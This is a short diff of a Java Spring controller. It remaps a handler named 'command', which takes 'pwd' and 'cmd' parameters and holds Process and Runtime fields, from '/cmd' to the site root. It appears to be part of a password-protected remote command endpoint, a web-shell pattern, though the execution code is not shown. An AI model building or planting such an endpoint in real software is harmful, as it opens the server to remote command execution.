@@ -14,7 +14,7 @@ public class IndexController {
     private Process p = null;
     private Runtime runtime = null;
 
-    @RequestMapping("/cmd")
+    @RequestMapping("/")
     public String command(String pwd, String cmd, Model model){
 
         String output = "";
